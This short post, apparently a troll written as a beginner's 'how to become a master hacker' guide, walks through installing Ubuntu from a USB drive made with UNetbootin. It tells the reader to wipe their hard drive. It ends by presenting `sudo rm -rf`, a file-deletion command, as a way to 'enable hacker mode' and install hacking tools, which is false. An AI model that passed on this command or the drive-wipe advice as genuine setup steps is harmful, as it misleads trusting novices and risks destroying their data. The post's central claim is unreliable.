how to become master hacker like me so first you're going to want to install linux, I recommend Ubuntu to start with. Here's how you install:

First, go to [unetbootin.github.io](https://unetbootin.github.io) and download unetbootin for your platform.

Next, plug in a 4gb or more USB drive.

Then, open Unetbootin, making sure to run it as an administrator if you're on Windows.

Click through the distributions UnetBootin offers to install, and pick your desired one, for this job pick Ubuntu, and in the version tab pick 20.04\_live\_x64.

Then, write it to your USB drive.

Now, boot the USB and follow the onscreen instructions, making sure to delete your hard drive and install only Ubuntu.

Now that you have Ubuntu installed, open terminal and type this:

`sudo rm -rf`

this enables hacker mode on Ubuntu, installing everything needed to become a hacker.
